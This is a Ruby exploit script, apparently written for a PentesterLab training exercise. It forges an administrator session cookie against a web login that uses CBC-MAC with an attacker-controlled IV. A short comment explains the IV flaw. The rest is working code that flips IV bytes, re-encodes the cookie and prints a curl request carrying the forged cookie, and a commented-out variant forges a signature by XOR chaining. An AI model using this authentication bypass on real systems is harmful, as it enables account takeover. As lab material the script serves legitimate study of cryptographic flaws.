# curl 'http://ptl-4c40e0f7-c6b34407.libcurl.so/index.php'  --data 'username=administ&password=Password1'
# cookie for "bdministrator" YmRtaW5pc3RyYXRvci0tW0Eem03x9pI%3D
# IV for "bdministrator" JqlIW5PHURQ%3D

# In cryptography, a cipher block chaining message authentication code (CBC-MAC) is a technique for constructing a 
# message authentication code from a block cipher. The message is encrypted with some block cipher algorithm in CBC 
# mode to create a chain of blocks such that each block depends on the proper encryption of the previous block. 
# This interdependence ensures that a change to any of the plaintext bits will cause the final encrypted block to 
# change in a way that cannot be predicted or counteracted without knowing the key to the block cipher. 

# This exploid deals with CBC-MAC and Initialisation Vector
# Proper implementation of CBC-MAC use a NULL Initialisation Vector: 
# a string of block-size that only contains NULL bytes. Having an hardcoded IV 
# doesn't impact the security of the implementation (quite the opposite). 
# The danger with using a specific IV is that it will often be controlled by the 
# attacker and completely breaks the integrity of the CBC-MAC signature.

# To get this attack working, you first need to login with a username very similar 
# to administrator (especially length-wise). Once you are logged in, you should get a 
# signature and an IV (both as cookie). Once you get both values, you just need to compute a 
# XOR of the first block of your username against the first block of administrator. Once you 
# get that value, you can just XOR it with the IV and use the result as the new IV. 



# require 'httparty' 
require 'uri'
require 'base64'


auth = "YmRtaW5pc3RyYXRvci0tW0Eem03x9pI%3D"
IV = "JqlIW5PHURQ%3D"

decoded_iv = Base64.decode64(URI.unescape(IV))
decoded_auth = Base64.decode64(URI.unescape(auth))


# malicious_iv[0] = 'a'^'b'^decoded_iv[0]
# malicious_iv[0] = ('a'.ord^'b'.ord^decoded_iv[0].ord).chr

decoded_iv[0]=('a'.ord^'b'.ord^decoded_iv[0].ord).chr
decoded_auth[0] = 'a'

puts new_iv = URI.escape(Base64.strict_encode64(decoded_iv), "+=/")
puts new_auth = URI.escape(Base64.strict_encode64(decoded_auth), "+=/")

puts "curl -H 'Cookie: iv=#{new_iv}; auth=#{new_auth}' http://ptl-4c40e0f7-c6b34407.libcurl.so/"

# URL = "http://ptl-4c40e0f7-c6b34407.libcurl.so/"
# def login(username)
#     res = HTTParty.post(URL+'login.php', body: {username: username, password: 'Password1'} ,follow_redirects:false)

#     # autho=VALUE
#     return res.headers["set-cookie"].split("=")[1]
# end

# cookie = login("administ")
# signature1 = Base64.decode64(cookie).split("--")[1]

# def xor(str1, str2)
#     ret = ""
#     str1.split(//).each_with_index do |c, i|
#         ret[i] = (str1[i].ord ^ str2[i].ord).chr
#     end
#     return ret
# end

# # this tested that the xor worked
# # puts xor("administ", "\00\00\00\00\00\00\00\00")

# username2 = xor("rator\00\00\00", signature1)

# cookie2 = login(username2).gsub("%2B", "+")
# puts cookie2 #testing cookie2 value
# signature2 = Base64.decode64(cookie2).split("--")[1]
# puts signature2 #testing signature2 value
# puts Base64.encode64("administrator--#{signature2}")